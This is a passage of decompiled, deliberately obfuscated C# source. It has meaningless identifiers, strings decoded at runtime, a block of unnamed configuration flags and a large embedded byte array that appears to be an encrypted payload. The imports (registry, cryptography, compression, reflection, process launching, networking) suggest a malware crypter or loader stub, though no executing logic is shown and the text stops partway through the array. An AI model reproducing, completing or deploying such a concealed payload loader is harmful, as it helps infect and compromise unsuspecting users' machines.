using System;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

internal class Class0
{
	private static object[] object_0 = new object[1]
	{
		new Class1
		{
			string_0 = smethod_3("Ã\u0090ª\u00af¦\u00ad·\u009c\u009bí¦»¦"),
			bool_0 = true,
			bool_1 = true,
			bool_2 = true,
			int_0 = 1,
			int_1 = 2,
			bool_3 = false,
			string_1 = smethod_3("×"),
			bool_4 = true,
			bool_5 = true,
			bool_6 = true,
			bool_7 = true,
			byte_0 = new byte[4768]
			{
				105, 86, 105, 215, 254, 208, 53, 86, 54, 251,
				79, 17, 190, 111, 166, 61, 190, 29, 153, 128,
				213, 186, 255, 104, 162, 175, 1, 240, 194, 177,
				166, 203, 121, 218, 52, 162, 51, 0, 225, 71,
				173, 194, 93, 248, 125, 144, 254, 10, 115, 69,
				210, 139, 54, 77, 48, 141, 200, 135, 101, 228,
				103, 82, 37, 4, 78, 14, 26, 63, 39, 48,
				222, 216, 30, 99, 111, 168, 133, 157, 158, 122,
				246, 135, 248, 147, 182, 206, 108, 26, 12, 87,
				133, 111, 8, 59, 113, 200, 245, 73, 246, 133,
				123, 48, 146, 233, 131, 167, 79, 106, 157, 165,
				145, 32, 80, 82, 166, 193, 53, 102, 40, 122,
				11, 216, 104, 104, 42, 196, 209, 118, 119, 249,
				212, 223, 249, 126, 230, 33, 74, 223, 2, 210,
				149, 168, 99, 234, 90, 2, 184, 199, 170, 227,
				175, 62, 152, 94, 109, 107, 5, 151, 189, 62,
				214, 195, 118, 75, 221, 191, 99, 0, 20, 34,
				50, 81, 45, 61, 102, 184, 243, 55, 227, 40,
				53, 178, 103, 60, 35, 11, 90, 98, 43, 47,
				170, 196, 5, 140, 96, 238, 213, 102, 23, 161,
				166, 70, 25, 221, 203, 253, 246, 55, 89, 40,
				6, 120, 249, 91, 178, 213, 26, 226, 252, 129,
				179, 60, 49, 125, 188, 251, 114, 75, 187, 35,
				72, 148, 48, 140, 34, 140, 96, 214, 62, 127,
				201, 7, 225, 135, 52, 4, 15, 90, 127, 210,
				135, 101, 16, 128, 81, 244, 198, 233, 107, 177,
				143, 182, 187, 120, 223, 97, 119, 179, 56, 181,
				217, 133, 84, 121, 172, 131, 151, 63, 109, 226,
				241, 26, 153, 45, 78, 191, 121, 43, 231, 59,
				164, 189, 155, 97, 85, 150, 192, 165, 191, 237,
				244, 111, 250, 147, 10, 250, 178, 186, 53, 184,
				134, 162, 52, 114, 156, 246, 202, 43, 124, 247,
				133, 41, 13, 28, 191, 153, 57, 244, 251, 40,
				7, 100, 80, 139, 198, 143, 189, 18, 252, 214,
				222, 99, 237, 131, 214, 112, 91, 174, 250, 194,
				0, 238, 205, 169, 169, 13, 200, 128, 31, 8,
				200, 99, 122, 209, 144, 66, 46, 219, 230, 38,
				255, 135, 185, 3, 19, 196, 233, 50, 13, 251,
				242, 177, 5, 93, 255, 247, 114, 208, 38, 66,
				141, 161, 119, 25, 145, 127, 10, 4, 238, 113,
				74, 37, 235, 204, 40, 98, 141, 24, 85, 143,
				213, 242, 0, 21, 208, 190, 50, 68, 36, 133,
				94, 65, 181, 237, 201, 162, 114, 180, 195, 95,
				187, 61, 20, 214, 244, 126, 125, 65, 131, 28,
				78, 173, 134, 79, 137, 41, 45, 10, 225, 238,
				190, 95, 234, 77, 158, 37, 115, 233, 218, 144,
				173, 222, 86, 14, 137, 195, 141, 200, 126, 23,
				127, 248, 45, 84, 166, 201, 67, 97, 50, 178,
				15, 67, 134, 135, 225, 202, 55, 189, 50, 171,
				239, 101, 245, 3, 127, 206, 8, 183, 32, 113,
				234, 76, 252, 144, 187, 33, 64, 207, 65, 82,
				14, 40, 85, 178, 77, 35, 24, 17, 223, 40,
				123, 119, 238, 26, 113, 32, 37, 42, 83, 16,
				189, 162, 93, 255, 82, 15, 157, 86, 215, 31,
				73, 4, 28, 134, 66, 129, 38, 2, 89, 101,
				73, 199, 89, 141, 161, 51, 117, 176, 106, 152,
				93, 237, 65, 32, 231, 255, 155, 40, 198, 166,
				191, 130, 87, 128, 182, 54, 122, 152, 56, 59,
				34, 68, 128, 42, 60, 80, 226, 245, 233, 172,
				178, 105, 53, 163, 198, 125, 188, 125, 48, 51,
				135, 247, 165, 185, 107, 56, 158, 233, 46, 193,
				13, 119, 192, 199, 142, 250, 17, 15, 105, 84,
				219, 40, 46, 238, 254, 148, 173, 118, 143, 13,
				205, 176, 33, 174, 237, 39, 118, 66, 180, 102,
				68, 138, 47, 132, 4, 101, 33, 15, 77, 182,
				190, 126, 51, 37, 237, 45, 66, 60, 133, 48,
				181, 223, 166, 252, 193, 198, 174, 123, 44, 244,
				203, 250, 133, 169, 202, 82, 176, 27, 211, 89,
				46, 108, 211, 50, 168, 14, 131, 52, 186, 174,
				188, 113, 73, 249, 152, 58, 243, 175, 62, 216,
				111, 48, 79, 30, 245, 147, 144, 9, 70, 190,
				211, 70, 124, 115, 127, 69, 123, 135, 194, 178,
				51, 166, 53, 56, 45, 240, 142, 82, 81, 38,
				128, 226, 128, 182, 138, 238, 76, 215, 76, 33,
				144, 93, 95, 117, 213, 104, 198, 129, 4, 116,
				82, 155, 40, 140, 93, 16, 142, 216, 144, 20,
				171, 223, 205, 21, 62, 111, 159, 206, 186, 53,
				189, 101, 162, 88, 82, 93, 121, 200, 217, 212,
				84, 247, 159, 115, 145, 173, 250, 165, 91, 215,
				145, 157, 139, 123, 22, 94, 70, 156, 9, 19,
				10, 240, 135, 29, 168, 37, 61, 236, 37, 8,
				168, 207, 228, 162, 5, 217, 230, 17, 0, 79,
				94, 220, 127, 243, 29, 121, 161, 77, 11, 35,
				243, 142, 141, 51, 154, 111, 234, 236, 90, 187,
				16, 44, 89, 202, 218, 231, 100, 205, 121, 93,
				77, 90, 16, 217, 75, 0, 211, 146, 229, 153,
				151, 88, 29, 51, 225, 226, 1, 32, 229, 79,
				100, 70, 11, 48, 175, 117, 161, 111, 171, 84,
				111, 171, 141, 60, 33, 157, 4, 190, 254, 238,
				112, 192, 225, 194, 191, 14, 116, 26, 57, 241,
				255, 251, 172, 182, 222, 254, 22, 114, 190, 153,
				73, 237, 42, 145, 68, 160, 205, 193, 80, 217,
				125, 236, 153, 214, 212, 224, 134, 14, 188, 109,
				59, 89, 28, 129, 120, 5, 82, 201, 65, 201,
				13, 83, 35, 63, 10, 51, 111, 73, 210, 193,
				79, 148, 181, 138, 110, 20, 188, 85, 36, 159,
				185, 54, 133, 84, 49, 39, 133, 126, 150, 239,
				238, 178, 176, 48, 47, 52, 206, 254, 77, 14,
				59, 6, 35, 22, 98, 178, 102, 110, 180, 235,
				200, 112, 227, 176, 135, 103, 172, 248, 99, 159,
				138, 44, 210, 77, 22, 188, 230, 238, 62, 180,
				3, 71, 190, 216, 123, 166, 36, 99, 136, 57,
				245, 15, 255, 190, 195, 146, 157, 132, 249, 96,
				218, 194, 181, 161, 121, 8, 181, 189, 176, 196,
				131, 123, 229, 238, 137, 85, 82, 49, 7, 248,
				7, 115, 112, 19, 218, 192, 119, 179, 45, 97,
				194, 196, 25, 23, 199, 254, 98, 173, 38, 223,
				194, 129, 216, 218, 203, 33, 149, 160, 210, 86,
				70, 214, 74, 178, 80, 250, 86, 131, 12, 137,
				180, 235, 71, 54, 209, 159, 76, 248, 96, 192,
				135, 59, 160, 122, 12, 31, 79, 39, 165, 35,
				87, 177, 62, 143, 65, 47, 153, 187, 232, 176,
				223, 104, 117, 205, 1, 32, 158, 135, 155, 141,
				52, 110, 142, 79, 211, 130, 236, 50, 237, 122,
				12, 40, 159, 117, 64, 151, 206, 156, 75, 173,
				15, 106, 236, 213, 5, 209, 91, 165, 115, 219,
				29, 251, 200, 198, 55, 9, 67, 103, 143, 98,
				31, 151, 164, 36, 170, 20, 165, 253, 130, 102,
				38, 13, 102, 244, 218, 165, 147, 77, 51, 87,
				145, 78, 124, 198, 56, 195, 58, 34, 145, 174,
				249, 183, 29, 103, 17, 72, 130, 64, 83, 9,
				143, 182, 125, 5, 174, 6, 195, 164, 24, 24,
				28, 233, 140, 90, 66, 195, 130, 85, 135, 62,
				245, 127, 156, 233, 74, 100, 47, 123, 95, 147,
				86, 49, 223, 58, 53, 99, 56, 55, 125, 13,
				235, 28, 234, 195, 162, 79, 65, 87, 236, 229,
				64, 235, 231, 15, 194, 134, 5, 193, 39, 12,
				185, 96, 230, 15, 79, 60, 235, 79, 210, 205,
				56, 187, 73, 129, 179, 162, 171, 72, 96, 205,
				43, 214, 237, 126, 233, 142, 55, 200, 33, 111,
				194, 29, 24, 230, 102, 191, 150, 222, 95, 154,
				40, 196, 137, 244, 168, 164, 0, 14, 179, 165,
				205, 137, 31, 181, 104, 1, 148, 92, 124, 7,
				167, 5, 194, 114, 81, 130, 32, 139, 14, 255,
				213, 119, 106, 188, 55, 120, 45, 17, 180, 18,
				225, 85, 53, 37, 115, 92, 201, 144, 53, 134,
				19, 67, 204, 28, 6, 91, 197, 202, 175, 208,
				224, 141, 203, 172, 125, 209, 146, 61, 111, 188,
				131, 207, 45, 235, 11, 38, 213, 189, 7, 249,
				21, 0, 137, 2, 11, 181, 157, 87, 26, 57,
				35, 127, 15, 166, 169, 175, 223, 166, 86, 92,
				93, 156, 127, 218, 133, 77, 155, 176, 203, 188,
				214, 253, 235, 76, 152, 93, 252, 101, 133, 2,
				207, 168, 188, 36, 34, 30, 105, 162, 7, 190,
				78, 252, 203, 173, 231, 101, 141, 33, 31, 247,
				119, 231, 49, 5, 29, 110, 210, 43, 149, 211,
				211, 125, 95, 151, 5, 180, 145, 250, 12, 166,
				165, 247, 37, 42, 157, 33, 237, 225, 216, 119,
				113, 164, 124, 190, 35, 78, 9, 206, 111, 55,
				78, 243, 4, 164, 155, 230, 19, 123, 129, 49,
				41, 207, 252, 33, 94, 219, 82, 28, 111, 25,
				163, 80, 204, 170, 106, 56, 164, 29, 226, 192,
				247, 22, 188, 217, 154, 100, 194, 63, 200, 68,
				196, 91, 224, 179, 217, 168, 163, 84, 51, 61,
				105, 189, 34, 51, 197, 139, 37, 84, 235, 40,
				165, 233, 227, 213, 121, 45, 184, 183, 9, 230,
				15, 140, 37, 56, 55, 237, 191, 44, 131, 138,
				134, 117, 83, 158, 184, 205, 198, 66, 248, 112,
				72, 232, 98, 151, 101, 120, 74, 65, 3, 185,
				231, 244, 44, 177, 190, 82, 77, 184, 251, 106,
				172, 49, 154, 232, 175, 205, 162, 191, 219, 250,
				217, 137, 237, 73, 121, 121, 219, 74, 172, 67,
				154, 194, 105, 219, 81, 4, 104, 84, 88, 93,
				165, 199, 249, 133, 158, 89, 134, 20, 44, 109,
				239, 202, 46, 158, 84, 68, 165, 133, 144, 206,
				138, 183, 228, 94, 185, 22, 20, 4, 37, 216,
				56, 58, 246, 126, 121, 50, 222, 108, 17, 206,
				56, 138, 60, 150, 208, 84, 98, 140, 13, 244,
				31, 65, 230, 137, 74, 135, 229, 53, 230, 158,
				151, 135, 86, 180, 56, 117, 9, 82, 129, 133,
				114, 223, 119, 36, 231, 193, 178, 254, 137, 194,
				195, 205, 73, 166, 223, 189, 189, 66, 61, 135,
				215, 248, 179, 0, 49, 27, 196, 230, 254, 71,
				14, 39, 31, 75, 139, 79, 131, 120, 3, 48,
				150, 13, 240, 168, 121, 2, 251, 194, 113, 242,
				127, 52, 0, 163, 112, 80, 24, 104, 72, 100,
				164, 61, 34, 234, 227, 204, 145, 98, 16, 97,
				239, 157, 160, 94, 19, 215, 159, 100, 188, 86,
				240, 81, 90, 25, 160, 118, 140, 195, 32, 181,
				142, 198, 206, 145, 214, 171, 228, 29, 112, 3,
				100, 195, 179, 95, 54, 195, 2, 81, 131, 12,
				219, 73, 253, 255, 113, 125, 110, 216, 145, 94,
				27, 38, 9, 9, 188, 116, 103, 179, 207, 41,
				193, 36, 156, 119, 71, 172, 236, 249, 109, 118,
				138, 164, 52, 204, 173, 224, 63, 141, 117, 109,
				194, 201, 200, 91, 234, 131, 77, 133, 8, 175,
				89, 128, 120, 110, 233, 234, 166, 189, 5, 209,
				140, 67, 211, 148, 117, 115, 5, 245, 103, 229,
				230, 34, 81, 32, 27, 23, 145, 173, 171, 241,
				16, 129, 215, 1, 108, 100, 231, 38, 107, 133,
				63, 100, 57, 129, 37, 180, 255, 255, 242, 66,
				25, 22, 216, 45, 139, 227, 80, 39, 115, 24,
				90, 87, 158, 254, 203, 200, 219, 198, 185, 229,
				127, 72, 89, 45, 96, 185, 104, 156, 146, 248,
				226, 50, 92, 210, 226, 51, 145, 68, 254, 175,
				142, 237, 4, 124, 137, 38, 250, 139, 31, 36,
				186, 228, 10, 184, 15, 95, 39, 69, 242, 221,
				123, 4, 181, 109, 240, 123, 77, 68, 97, 163,
				117, 235, 217, 184, 218, 207, 9, 223, 170, 76,
				195, 238, 217, 145, 179, 94, 142, 57, 213, 29,
				38, 159, 168, 92, 216, 29, 4, 126, 190, 106,
				183, 245, 248, 217, 198, 243, 147, 212, 169, 155,
				205, 174, 10, 60, 184, 97, 120, 167, 167, 183,
				215, 195, 52, 183, 137, 222, 36, 137, 85, 2,
				196, 151, 246, 198, 209, 94, 157, 234, 77, 172,
				37, 176, 7, 158, 30, 87, 139, 36, 89, 9,
				109, 217, 57, 72, 133, 143, 254, 200, 117, 142,
				11, 169, 99, 245, 167, 68, 112, 74, 216, 232,
				9, 17, 100, 114, 226, 153, 146, 185, 211, 80,
				99, 12, 130, 158, 218, 13, 150, 233, 57, 56,
				188, 12, 86, 128, 234, 131, 209, 236, 15, 172,
				221, 104, 250, 179, 35, 158, 14, 27, 110, 29,
				68, 8, 103, 226, 174, 177, 125, 5, 91, 239,
				181, 229, 237, 195, 5, 155, 129, 116, 108, 49,
				56, 13, 226, 61, 22, 140, 234, 11, 161, 218,
				184, 163, 159, 98, 140, 33, 17, 205, 91, 83,
				60, 236, 64, 59, 123, 228, 209, 89, 170, 14,
				17, 174, 64, 144, 115, 185, 47, 148, 29, 62,
				253, 21, 101, 94, 49, 54, 175, 129, 200, 172,
				0, 101, 138, 172, 239, 6, 246, 9, 165, 192,
				41, 230, 190, 0, 48, 124, 211, 230, 75, 16,
				201, 212, 137, 55, 24, 134, 100, 20, 95, 120,
				225, 54, 125, 236, 236, 180, 223, 138, 7, 35,
				236, 161, 51, 66, 79, 220, 92, 185, 162, 77,
				173, 135, 187, 49, 32, 176, 253, 216, 123, 230,
				79, 105, 99, 80, 207, 249, 254, 203, 47, 73,
				241, 83, 37, 175, 147, 54, 105, 17, 92, 208,
				27, 154, 31, 137, 59, 250, 196, 197, 194, 41,
				185, 181, 242, 209, 207, 163, 93, 150, 159, 179,
				206, 183, 20, 234, 51, 222, 172, 33, 44, 115,
				9, 39, 52, 164, 224, 72, 49, 210, 78, 152,
				120, 78, 83, 29, 94, 116, 177, 21, 114, 158,
				159, 217, 154, 76, 215, 174, 164, 182, 107, 177,
				223, 199, 254, 92, 212, 29, 50, 210, 141, 144,
				140, 113, 137, 189, 140, 88, 196, 134, 184, 68,
				137, 145, 35, 85, 101, 180, 239, 40, 50, 158,
				89, 5, 175, 122, 233, 235, 57, 130, 113, 129,
				48, 228, 54, 154, 145, 5, 13, 81, 21, 106,
				56, 147, 38, 173, 148, 153, 57, 23, 155, 228,
				43, 9, 119, 90, 232, 174, 80, 130, 155, 147,
				186, 71, 66, 211, 116, 181, 252, 97, 144, 136,
				154, 22, 254, 141, 182, 50, 49, 41, 56, 118,
				38, 168, 80, 140, 168, 149, 43, 116, 44, 18,
				174, 56, 28, 206, 104, 94, 78, 34, 9, 140,
				81, 67, 205, 223, 246, 198, 84, 223, 159, 42,
				113, 143, 56, 119, 184, 27, 150, 45, 200, 129,
				201, 219, 230, 110, 56, 243, 79, 18, 162, 111,
				238, 187, 235, 93, 231, 130, 220, 171, 65, 251,
				74, 62, 52, 97, 50, 200, 72, 50, 145, 16,
				18, 100, 40, 113, 177, 85, 200, 124, 157, 179,
				253, 128, 55, 251, 37, 249, 246, 96, 174, 157,
				96, 56, 76, 139, 243, 25, 4, 221, 23, 46,
				100, 133, 120, 211, 181, 207, 189, 247, 56, 40,
				37, 7, 25, 81, 197, 102, 29, 117, 57, 200,
				127, 130, 202, 88, 33, 17, 87, 99, 239, 134,
				166, 136, 240, 244, 12, 120, 147, 91, 235, 47,
				168, 10, 154, 210, 10, 28, 194, 220, 51, 232,
				101, 142, 227, 91, 183, 119, 177, 226, 141, 148,
				31, 156, 82, 20, 108, 79, 74, 80, 224, 49,
				70, 242, 45, 240, 80, 105, 60, 132, 66, 203,
				250, 171, 50, 231, 111, 146, 192, 222, 67, 148,
				52, 60, 177, 88, 157, 92, 18, 140, 88, 221,
				169, 24, 205, 59, 139, 24, 28, 219, 203, 226,
				153, 255, 216, 134, 154, 138, 170, 57, 88, 113,
				190, 35, 4, 6, 64, 79, 212, 197, 43, 63,
				139, 148, 170, 97, 98, 17, 164, 148, 88, 137,
				137, 166, 242, 250, 101, 105, 165, 86, 76, 204,
				156, 171, 193, 103, 71, 5, 15, 18, 246, 152,
				234, 164, 26, 34, 76, 30, 203, 123, 18, 211,
				166, 112, 131, 165, 111, 125, 73, 93, 29, 154,
				61, 51, 168, 165, 240, 156, 151, 229, 55, 85,
				16, 79, 12, 157, 187, 189, 38, 250, 31, 187,
				121, 150, 130, 250, 69, 12, 81, 249, 67, 193,
				184, 246, 114, 223, 66, 146, 2, 27, 134, 106,
				250, 144, 216, 249, 26, 246, 191, 181, 163, 161,
				165, 14, 84, 187, 141, 33, 3, 25, 242, 234,
				133, 194, 193, 29, 112, 160, 246, 120, 131, 183,
				123, 233, 128, 103, 144, 70, 205, 87, 217, 51,
				80, 182, 16, 223, 155, 160, 169, 82, 116, 177,
				100, 74, 23, 66, 233, 101, 129, 176, 170, 230,
				178, 27, 213, 0, 165, 133, 241, 231, 137, 208,
				166, 231, 14, 249, 90, 115, 241, 74, 67, 59,
				9, 240, 166, 223, 42, 145, 233, 227, 24, 247,
				211, 1, 45, 167, 239, 216, 94, 234, 201, 44,
				230, 154, 189, 6, 58, 89, 1, 213, 217, 172,
				19, 229, 46, 76, 139, 132, 139, 77, 64, 218,
				178, 52, 76, 255, 75, 88, 128, 2, 67, 138,
				241, 67, 170, 205, 172, 50, 186, 114, 13, 31,
				230, 243, 66, 78, 207, 154, 87, 244, 214, 156,
				129, 208, 122, 188, 189, 251, 234, 161, 24, 26,
				111, 179, 223, 146, 122, 143, 245, 172, 103, 225,
				149, 92, 159, 3, 45, 33, 112, 80, 150, 28,
				145, 69, 113, 111, 23, 6, 56, 179, 84, 68,
				161, 40, 244, 37, 118, 169, 73, 240, 62, 44,
				168, 83, 244, 208, 1, 124, 93, 47, 221, 211,
				56, 11, 162, 12, 69, 7, 182, 39, 181, 221,
				163, 231, 130, 40, 138, 32, 121, 63, 210, 242,
				90, 102, 181, 245, 133, 67, 78, 67, 192, 201,
				76, 46, 201, 177, 141, 74, 99, 229, 210, 98,
				153, 76, 165, 170, 98, 23, 128, 83, 154, 168,
				101, 222, 17, 32, 251, 177, 115, 1, 148, 82,
				141, 134, 101, 174, 249, 226, 61, 236, 53, 62,
				227, 205, 129, 177, 61, 150, 101, 25, 21, 71,
				161, 23, 9, 219, 166, 226, 182, 69, 12, 209,
				181, 219, 24, 31, 105, 164, 165, 70, 250, 198,
				63, 137, 183, 56, 183, 105, 72, 161, 173, 250,
				155, 179, 41, 133, 75, 138, 82, 57, 236, 155,
				48, 9, 27, 155, 226, 192, 172, 117, 19, 72,
				101, 18, 192, 30, 148, 120, 241, 253, 86, 189,
				138, 167, 195, 142, 12, 73, 102, 0, 68, 244,
				193, 56, 175, 241, 105, 158, 218, 11, 243, 248,
				94, 190, 32, 189, 168, 101, 216, 95, 171, 133,
				236, 160, 5, 144, 210, 178, 93, 68, 141, 172,
				118, 85, 246, 208, 132, 208, 213, 203, 49, 30,
				32, 242, 113, 156, 193, 168, 8, 206, 112, 217,
				154, 21, 120, 226, 135, 145, 118, 200, 30, 118,
				131, 15, 117, 205, 241, 151, 163, 138, 213, 103,
				191, 177, 13, 143, 175, 176, 255, 49, 111, 28,
				69, 212, 91, 30, 24, 134, 74, 234, 171, 71,
				28, 157, 58, 186, 213, 190, 162, 120, 130, 210,
				64, 139, 231, 73, 44, 13, 212, 232, 127, 11,
				102, 38, 59, 81, 20, 80, 239, 26, 118, 64,
				196, 12, 87, 76, 9, 23, 22, 129, 242, 61,
				0, 248, 71, 197, 217, 141, 139, 245, 92, 214,
				251, 194, 210, 197, 230, 177, 191, 173, 16, 186,
				195, 33, 227, 69, 108, 123, 164, 131, 70, 103,
				227, 3, 72, 220, 168, 119, 98, 52, 88, 211,
				244, 30, 152, 159, 138, 200, 234, 148, 107, 112,
				197, 7, 254, 52, 156, 118, 25, 103, 24, 56,
				83, 160, 186, 246, 64, 133, 96, 46, 44, 98,
				101, 193, 71, 181, 153, 232, 38, 157, 85, 112,
				137, 207, 102, 88, 220, 193, 109, 252, 106, 171,
				86, 222, 50, 191, 176, 68, 202, 119, 118, 207,
				50, 159, 71, 18, 240, 90, 196, 30, 117, 134,
				203, 173, 243, 39, 179, 83, 20, 208, 54, 231,
				250, 242, 28, 68, 175, 18, 236, 27, 2, 11,
				101, 172, 228, 164, 157, 195, 231, 163, 146, 226,
				150, 21, 243, 192, 20, 107, 0, 61, 135, 121,
				154, 25, 238, 253, 5, 17, 186, 212, 86, 136,
				152, 180, 61, 104, 14, 246, 137, 168, 225, 229,
				227, 0, 20, 33, 160, 190, 218, 164, 158, 110,
				126, 102, 174, 33, 12, 6, 42, 26, 49, 67,
				212, 89, 121, 80, 196, 108, 41, 239, 157, 172,
				94, 11, 187, 39, 207, 142, 1, 54, 116, 244,
				243, 81, 205, 173, 221, 108, 250, 222, 192, 59,
				255, 237, 62, 70, 150, 81, 108, 121, 134, 22,
				35, 195, 126, 235, 37, 171, 243, 17, 92, 225,
				107, 29, 21, 105, 224, 216, 86, 36, 170, 73,
				119, 9, 18, 227, 221, 159, 53, 180, 222, 44,
				255, 112, 142, 240, 233, 150, 238, 251, 176, 40,
				216, 139, 237, 171, 10, 248, 173, 103, 102, 109,
				163, 226, 153, 125, 79, 168, 170, 78, 111, 53,
				88, 114, 208, 114, 35, 229, 188, 161, 241, 69,
				205, 28, 8, 248, 86, 68, 194, 70, 129, 95,
				254, 230, 150, 227, 165, 171, 75, 242, 61, 97,
				223, 147, 193, 210, 98, 104, 148, 30, 175, 7,
				106, 96, 224, 231, 27, 13, 157, 44, 244, 6,
				236, 241, 196, 244, 192, 172, 161, 139, 167, 6,
				237, 193, 137, 112, 204, 90, 75, 204, 7, 3,
				185, 29, 252, 225, 204, 193, 243, 223, 248, 99,
				130, 123, 228, 126, 87, 173, 252, 205, 79, 172,
				218, 220, 155, 247, 218, 49, 52, 184, 153, 50,
				215, 9, 111, 67, 20, 248, 55, 130, 207, 217,
				209, 37, 0, 223, 56, 94, 237, 139, 115, 108,
				7, 253, 137, 60, 65, 191, 41, 249, 10, 3,
				255, 103, 139, 228, 207, 241, 3, 238, 125, 6,
				178, 206, 40, 200, 0, 27, 42, 207, 248, 40,
				84, 15, 8, 234, 110, 19, 38, 40, 188, 3,
				56, 34, 154, 254, 47, 41, 152, 183, 203, 23,
				172, 110, 153, 87, 239, 156, 208, 116, 36, 80,
				54, 32, 212, 41, 251, 144, 107, 248, 236, 163,
				28, 69, 160, 90, 76, 246, 131, 158, 126, 35,
				123, 122, 44, 207, 222, 154, 255, 12, 238, 255,
				227, 38, 189, 164, 12, 49, 81, 58, 239, 216,
				23, 3, 193, 15, 246, 241, 255, 2, 116, 228,
				49, 211, 74, 205, 160, 159, 164, 157, 85, 164,
				140, 161, 131, 164, 86, 8, 114, 85, 12, 147,
				71, 143, 94, 1, 4, 179, 226, 63, 175, 162,
				155, 140, 219, 86, 209, 60, 23, 246, 121, 66,
				25, 140, 200, 119, 94, 47, 134, 179, 75, 171,
				216, 55, 128, 63, 114, 163, 78, 81, 3, 105,
				229, 249, 191, 209, 229, 63, 166, 171, 31, 94,
				41, 161, 148, 143, 141, 76, 120, 92, 137, 112,
				187, 52, 96, 166, 69, 229, 168, 150, 29, 246,
				172, 159, 64, 135, 71, 53, 17, 127, 118, 234,
				39, 239, 87, 145, 29, 106, 195, 25, 91, 99,
				67, 206, 255, 107, 183, 5, 70, 243, 36, 229,
				112, 218, 194, 202, 28, 69, 215, 86, 240, 94,
				141, 23, 230, 175, 158, 247, 79, 210, 70, 240,
				64, 13, 114, 33, 114, 76, 6, 64, 191, 54,
				144, 215, 239, 42, 203, 62, 253, 239, 152, 225,
				127, 154, 194, 13, 233, 207, 162, 194, 96, 78,
				212, 124, 61, 137, 246, 53, 141, 6, 167, 188,
				75, 25, 114, 188, 166, 182, 222, 56, 185, 64,
				7, 165, 252, 108, 96, 57, 121, 48, 6, 158,
				248, 79, 146, 113, 248, 142, 129, 59, 43, 141,
				82, 55, 102, 69, 63, 151, 9, 132, 243, 54,
				212, 32, 35, 46, 60, 185, 164, 186, 56, 44,
				40, 217, 187, 156, 11, 214, 57, 93, 173, 4,
				167, 100, 241, 243, 213, 21, 67, 143, 36, 219,
				32, 21, 176, 188, 228, 80, 19, 240, 82, 125,
				135, 140, 156, 106, 60, 20, 246, 248, 37, 56,
				223, 81, 40, 109, 164, 24, 231, 137, 113, 224,
				95, 78, 23, 14, 163, 20, 208, 251, 79, 241,
				59, 93, 144, 209, 149, 140, 50, 196, 23, 215,
				47, 234, 161, 172, 163, 94, 98, 141, 252, 17,
				198, 182, 131, 40, 111, 208, 242, 95, 178, 207,
				103, 161, 12, 85, 119, 56, 180, 18, 25, 227,
				106, 244, 207, 141, 33, 174, 10, 88, 168, 144,
				53, 179, 253, 204, 80, 127, 214, 227, 102, 63,
				28, 189, 223, 72, 106, 107, 62, 72, 139, 71,
				228, 61, 25, 152, 58, 143, 166, 216, 235, 111,
				83, 42, 113, 99, 132, 12, 214, 66, 210, 227,
				56, 97, 216, 90, 231, 217, 141, 34, 246, 24,
				16, 57, 156, 100, 211, 23, 179, 145, 255, 73,
				109, 108, 234, 77, 27, 131, 5, 225, 78, 38,
				255, 238, 130, 97, 87, 175, 19, 183, 158, 149,
				82, 7, 197, 48, 116, 38, 217, 208, 122, 193,
				39, 197, 223, 219, 176, 146, 54, 182, 248, 203,
				36, 227, 36, 50, 181, 151, 150, 231, 216, 133,
				227, 53, 208, 187, 156, 253, 245, 182, 207, 12,
				196, 32, 17, 162, 254, 237, 176, 62, 105, 112,
				233, 190, 77, 192, 236, 11, 109, 182, 214, 204,
				99, 182, 232, 7, 248, 203, 158, 97, 8, 198,
				196, 168, 96, 30, 28, 81, 78, 158, 83, 182,
				155, 113, 29, 208, 103, 115, 83, 226, 207, 40,
				116, 48, 242, 147, 177, 158, 186, 81, 57, 101,
				129, 89, 107, 6, 50, 23, 60, 42, 149, 165,
				37, 5, 166, 32, 181, 50, 248, 73, 41, 100,
				34, 160, 121, 112, 245, 191, 168, 226, 23, 217,
				196, 100, 186, 25, 0, 120, 68, 83, 250, 218,
				222, 59, 2, 70, 112, 167, 48, 19, 218, 132,
				245, 94, 7, 146, 216, 47, 83, 144, 96, 98,
				247, 13, 45, 119, 182, 43, 50, 43, 196, 128,
				160, 41, 30, 17, 36, 189, 106, 197, 254, 39,
				141, 241, 87, 151, 18, 45, 207, 110, 221, 130,
				83, 189, 235, 126, 238, 43, 52, 44, 245, 234,
				54, 58, 156, 17, 225, 25, 219, 246, 90, 10,
				92, 255, 102, 184, 246, 50, 209, 82, 41, 219,
				158, 14, 124, 82, 59, 218, 81, 105, 250, 126,
				148, 164, 168, 149, 113, 165, 92, 19, 220, 165,
				128, 79, 243, 32, 175, 189, 96, 113, 73, 224,
				197, 206, 23, 31, 192, 81, 89, 201, 106, 173,
				94, 58, 61, 153, 126, 129, 50, 68, 248, 195,
				29, 232, 252, 52, 208, 17, 123, 71, 49, 42,
				105, 40, 153, 174, 127, 215, 8, 155, 231, 38,
				36, 169, 147, 74, 34, 24, 210, 234, 20, 204,
				15, 125, 106, 247, 34, 133, 77, 242, 60, 196,
				186, 117, 186, 111, 200, 206, 237, 116, 57, 114,
				209, 80, 61, 174, 175, 227, 115, 41, 178, 49,
				42, 68, 252, 241, 73, 144, 169, 64, 38, 225,
				240, 239, 235, 228, 106, 139, 215, 129, 210, 254,
				155, 185, 128, 21, 76, 36, 90, 155, 172, 2,
				92, 71, 26, 116, 133, 187, 250, 94, 37, 231,
				247, 93, 68, 254, 151, 20, 113, 0, 112, 58,
				34, 172, 170, 30, 117, 222, 193, 36, 30, 35,
				182, 39, 22, 2, 65, 121, 41, 90, 18, 82,
				71, 64, 240, 71, 30, 137, 27, 142, 102, 105,
				164, 51, 217, 40, 179, 217, 82, 28, 243, 25,
				138, 170, 47, 232, 78, 176, 195, 73, 197, 179,
				73, 130, 180, 242, 107, 88, 43, 156, 191, 134,
				237, 7, 65, 14, 57, 191, 66, 112, 77, 37,
				67, 247, 136, 157, 17, 203, 179, 130, 6, 157,
				127, 124, 103, 55, 157, 100, 127, 109, 72, 108,
				160, 132, 61, 248, 212, 12, 27, 86, 61, 53,
				215, 90, 96, 128, 208, 142, 210, 61, 237, 218,
				176, 30, 144, 57, 153, 145, 168, 38, 138, 3,
				144, 190, 63, 133, 37, 184, 133, 203, 137, 197,
				225, 55, 235, 151, 108, 216, 83, 81, 243, 192,
				164, 246, 4, 169, 104, 252, 151, 190, 176, 106,
				66, 144, 253, 130, 25, 32, 188, 42, 109, 90,
				134, 199, 76, 22, 49, 106, 55, 205, 143, 125,
